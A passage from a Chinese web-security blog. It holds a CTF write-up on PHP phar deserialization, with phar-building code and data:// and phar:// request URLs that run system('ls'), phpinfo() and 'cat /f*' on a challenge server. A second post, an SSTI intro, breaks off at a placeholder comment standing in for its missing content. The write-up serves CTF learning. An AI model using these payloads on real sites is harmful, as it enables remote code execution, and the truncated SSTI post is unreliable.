class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这样执行成功后会在本地生成一个phar的文件</p>
<p>然后我们读取里面的信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ph</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ph</span>.<span class="string">&quot;\n&quot;</span>;   <span class="comment">//很多乱码 所以用base64加密一下</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$ph</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>out：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> <span class="title function_ invoke__">__HALT_COMPILER</span>(); <span class="meta">?&gt;</span></span><br><span class="line">�fO:<span class="number">8</span>:<span class="string">&quot;Template&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pattern&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;suffix&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;.php&quot;</span>;&#125;test.txty�d~ضtest�jKn<span class="string">&#x27; Ii�Fi۶� ޅF�GBMB</span></span><br><span class="line"><span class="string">R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=</span></span><br></pre></td></tr></table></figure>

<p>data读取：</p>
<p>​<code>data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=</code>​</p>
<p>那么现在我们如何让题目所在服务器读取我们的data？可以回想到该题目的第一个界面</p>
<p>我们使用<strong>变量覆盖的方法读取</strong>内容 ！！注意嗷 一定要url编码一下哈</p>
<p>​<code>http://122.114.252.87:1120/?var[template][tp1]=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CR0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%2BDQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5%2F2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI%3D&amp;tp=tp1</code>​</p>
<p><img src="/.com//17476582446048249458991917343755-20250519203725-ec9ermw.png" alt="17476582446048249458991917343755"></p>
<p>写入成功</p>
<p><img src="/.com//17476582583645402199081299806411-20250519203739-x9hipvl.png" alt="17476582583645402199081299806411"></p>
<p><strong>触发phar：</strong></p>
<p>​<code>phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/6c50d8d7eaa92dc4998351838da62dcc.html</code>​继续使用刚刚的file_get_contents函数加变量覆盖进行读取</p>
<p>​<code>http://122.114.252.87:1120/?var[template][tp1]=phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fuploads%2F7cddc639132e5953bf969cc3c9b08fd7%2F6c50d8d7eaa92dc4998351838da62dcc.html&amp;tp=tp1</code><img src="/.com//17476582766138360737958902537856-20250519203759-qo996jy.png" alt="17476582766138360737958902537856"></p>
<p>执行成功 成功获得php后缀</p>
<p>因为我的命令是ls 所以访问后结果是列出的内容</p>
<p><strong>测试phpinfo</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$suffix</span> = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Template</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqZAAAAAQAAABEAAAABAAAAAABjAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjE4OiI8P3BocCBwaHBpbmZvKCk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAALoiuWQEAAAADH5/2LYBAAAAAAAAdGVzdPzuNzRrPw2POwCmprLd6Oy5KqEDAgAAAEdCTUI=&amp;tp=tp1</a></p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;2d867d52da656654f238ad3f2eceda1d.html</p>
<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/2d867d52da656654f238ad3f2eceda1d.html&amp;tp=tp1</a></p>
<p><img src="/.com//1747658344956718479055138235582-20250519203906-jvepfqt.png" alt="1747658344956718479055138235582"></p>
<p><strong>测试根目录</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$suffix</span> = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Template</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqeAAAAAQAAABEAAAABAAAAAABoAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIzOiI8P3BocCBzeXN0ZW0oJ2xzIC8nKTs/PiI7czo3OiJwYXR0ZXJuIjtOO3M6Njoic3VmZml4IjtzOjQ6Ii5waHAiO30IAAAAdGVzdC50eHQEAAAA3yO5ZAQAAAAMfn/YtgEAAAAAAAB0ZXN0ytJDUfSL2VfkbJ2LEtfOtvBCIMUCAAAAR0JNQg==&amp;tp=tp1</a></p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;ed5cb36b19cdb7f89f98caaa83efda37.html</p>
<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/ed5cb36b19cdb7f89f98caaa83efda37.html&amp;tp=tp1</a></p>
<p><img src="/.com//17476583692577796986138384772586-20250519203930-ih4wpf3.png" alt="17476583692577796986138384772586"></p>
<p><strong>获取flag</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$suffix</span> = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Template</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqjAAAAAQAAABEAAAABAAAAAABtAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjI4OiI8P3BocCBzeXN0ZW0oJ2NhdCAvZmxhZycpOz8+IjtzOjc6InBhdHRlcm4iO047czo2OiJzdWZmaXgiO3M6NDoiLnBocCI7fQgAAAB0ZXN0LnR4dAQAAAB1JblkBAAAAAx+f9i2AQAAAAAAAHRlc3QyIp89T4AF5NafJYGx4f8/1grOagIAAABHQk1C&amp;tp=tp1</a></p>
<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;7cddc639132e5953bf969cc3c9b08fd7&#x2F;50d6dc5cc571407544cd2bff51338b7e.html</p>
<p><a target="_blank" rel="noopener" href="http://122.114.252.87:1120/?var%5Btemplate%5D%5Btp1%5D=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&tp=tp1">http://122.114.252.87:1120/?var[template][tp1]=phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/50d6dc5cc571407544cd2bff51338b7e.html&amp;tp=tp1</a></p>
<p>步骤是对的可能没有写flag嘿嘿 到此结束！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/" data-id="cmawczpov004pik7kea5s0ls4" data-title="反序列化题目练习" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web/注入漏洞/SSTI（模板注入）/SSTI前篇" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/04/25/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/SSTI%E5%89%8D%E7%AF%87/" class="article-date">
  <time class="dt-published" datetime="2024-04-24T16:00:00.000Z" itemprop="datePublished">2024-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>►<a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/04/25/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/SSTI%E5%89%8D%E7%AF%87/">SSTI前篇</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        
## 前言 模板引擎

模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。

模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。

## **1**|**2SSTI（模板注入）**

SSTI 就是服务器端模板注入（Server-Side Template Injection）

当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。

## **1**|**3附表**

![image](assets/image-20250425223010-i7n3kwr.png)

# **2**|**0Php中的SSTI**

php常见的模板：twig，smarty，blade

## **2**|**1Twig**

Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">&#123;% raw %&#125;</span><br><span class="line">　　<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line">&#123;% endraw %&#125;</span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

// ... 剩余完整文件内容，确保所有模板示例代码都包裹在{% raw %}{% endraw %}标签中 ... 

<h1 id="6-0参考链接"><a href="#6-0参考链接" class="headerlink" title="6|0参考链接"></a><strong>6</strong>|<strong>0参考链接</strong></h1>{% raw %}{% endraw %} 
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/04/25/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SSTI%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/SSTI%E5%89%8D%E7%AF%87/" data-id="cmawczpof003cik7kfrcvgyz8" data-title="SSTI前篇" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/9/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" 